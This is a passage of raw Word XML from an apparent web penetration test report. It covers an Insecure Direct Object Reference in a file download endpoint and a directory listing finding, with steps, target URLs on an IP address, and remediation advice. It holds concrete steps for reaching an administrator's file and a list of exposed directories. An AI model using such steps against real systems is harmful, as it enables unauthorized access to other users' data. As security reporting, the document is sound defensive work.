              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Source</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1921" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Dynamic Manual Analysis</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:trPr>
          <w:trHeight w:val="909"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00FB304F" w:rsidRPr="00FB304F" w:rsidRDefault="00FB304F" w:rsidP="00FB304F">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00FB304F">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Insecure Direct Object References occur when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability attackers can bypass authorization and access resources in the system directly, for example database records or files. </w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00FB304F" w:rsidRPr="00FB304F" w:rsidRDefault="00FB304F" w:rsidP="00FB304F">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00FB304F">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Insecure Direct Object References allow attackers to bypass authorization and access resources directly by modifying the value of a parameter used to directly point to an object. Such resources can be database entries belonging to other users, files in the system, and more. This is caused by the fact that the application takes user supplied input and uses it to retrieve an object without performing sufficient authorization checks. </w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00FB304F">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:trPr>
          <w:trHeight w:val="1165"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Instance1</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>URL</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:hyperlink r:id="rId30" w:history="1">
              <w:r w:rsidR="005D7D56" w:rsidRPr="00147D31">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:sz w:val="28"/>
                  <w:szCs w:val="28"/>
                </w:rPr>
                <w:t>http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/file_download.php?file_id=1&amp;type=doc</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidR="005D7D56" w:rsidRPr="005D7D56">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="005D7D56" w:rsidRDefault="005D7D56" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Vulnerable Parameter: </w:t>
            </w:r>
            <w:r w:rsidR="005D7D56">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>file_id, type</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>S</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>teps</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRDefault="005D7D56" w:rsidP="005D7D56">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="21"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Navigate to above URL and Login with Manager credentials.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="005D7D56" w:rsidRPr="00802CE3" w:rsidRDefault="005D7D56" w:rsidP="005D7D56">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="21"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Access the downloaded file </w:t>
            </w:r>
            <w:r w:rsidRPr="005D7D56">
              <w:rPr>
                <w:i/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>API-Doc.txt</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> that is owned by administrator.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Screenshot:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="005D7D56" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4885D8F3" wp14:editId="5E95AD5B">
                  <wp:extent cx="7245350" cy="38944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245350" cy="3894455"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="005D7D56">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Fig 1. </w:t>
            </w:r>
            <w:r w:rsidR="005D7D56">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>IDOR</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="005D7D56" w:rsidRPr="005D7D56" w:rsidRDefault="00A81704" w:rsidP="005D7D56">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:after="600"/>
              <w:textAlignment w:val="baseline"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:color w:val="404040"/>
                <w:sz w:val="32"/>
                <w:szCs w:val="32"/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Remediation:</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="005D7D56" w:rsidRPr="005D7D56">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:color w:val="404040"/>
                <w:sz w:val="32"/>
                <w:szCs w:val="32"/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:t>The only real solution to this issue is to implement an access control. The user needs to be authorized for the requested information before the server provides it.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="005D7D56" w:rsidRDefault="005D7D56" w:rsidP="005D7D56">
            <w:pPr>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:suppressAutoHyphens w:val="0"/>
              <w:spacing w:after="600"/>
              <w:textAlignment w:val="baseline"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:color w:val="404040"/>
                <w:sz w:val="32"/>
                <w:szCs w:val="32"/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005D7D56">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:color w:val="404040"/>
                <w:sz w:val="32"/>
                <w:szCs w:val="32"/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:t>It is also often recommended to use something less obvious that is harder to enumerate as a reference. Eg., a random string instead of an incrementing integer. This can be a good idea for multiple reasons, but should absolutely not be trusted as the only prevention against such an attack.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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tbl>
      <w:tblPr>
        <w:tblW w:w="1152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919"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1921"/>
      </w:tblGrid>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1919" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Vulnerability</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9601" w:type="dxa"/>
            <w:gridSpan w:val="5"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="005453D1" w:rsidP="005453D1">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Directory Listing</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1919" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Risk Rating</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="005453D1" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Issue Count</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Source</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1921" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Dynamic Manual Analysis</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:trPr>
          <w:trHeight w:val="909"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="005453D1" w:rsidRPr="005453D1" w:rsidRDefault="005453D1" w:rsidP="005453D1">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005453D1">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Web servers are usually configured to disallow listings of directories containing scripts and textual contents. However, if the web server was configured improperly, it is possible to retrieve a directory listing by sending a request for a specific directory, rather than for a file. Example request for a directory listing of the directory named "some_dir" :</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="005453D1" w:rsidRPr="005453D1" w:rsidRDefault="005453D1" w:rsidP="005453D1">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="005453D1" w:rsidRPr="005453D1" w:rsidRDefault="005453D1" w:rsidP="005453D1">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005453D1">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>http://TARGET/some_dir/</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="005453D1" w:rsidRPr="005453D1" w:rsidRDefault="005453D1" w:rsidP="005453D1">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="005453D1" w:rsidP="005453D1">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005453D1">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>The directory listing is used by an attacker to locate files in the web directories that are not normally exposed through links on the web site. Configuration files and other components of web applications that potentially contain sensitive information can be viewed this way.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:trPr>
          <w:trHeight w:val="1165"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRDefault="005453D1" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Instances</w:t>
            </w:r>
            <w:r w:rsidR="00A81704" w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>URL</w:t>
            </w:r>
            <w:r w:rsidR="005453D1">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>s</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="005453D1" w:rsidRDefault="005453D1" w:rsidP="005453D1">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:hyperlink r:id="rId32" w:history="1">
              <w:r w:rsidRPr="00147D31">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:sz w:val="28"/>
                  <w:szCs w:val="28"/>
                </w:rPr>
                <w:t>http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/core/</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
          <w:p w:rsidR="005453D1" w:rsidRDefault="005453D1" w:rsidP="005453D1">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:hyperlink r:id="rId33" w:history="1">
              <w:r w:rsidRPr="00147D31">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:sz w:val="28"/>
                  <w:szCs w:val="28"/>
                </w:rPr>
                <w:t>http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/api/</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRDefault="005453D1" w:rsidP="005453D1">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:hyperlink r:id="rId34" w:history="1">
              <w:r w:rsidRPr="00147D31">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:sz w:val="28"/>
                  <w:szCs w:val="28"/>
                </w:rPr>
                <w:t>http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/doc/</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
          <w:p w:rsidR="005453D1" w:rsidRDefault="005453D1" w:rsidP="005453D1">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:hyperlink r:id="rId35" w:history="1">
              <w:r w:rsidRPr="005453D1">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:sz w:val="28"/>
                  <w:szCs w:val="28"/>
                </w:rPr>
                <w:t>http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/tmp/</w:t>
              </w:r>
            </w:hyperlink>
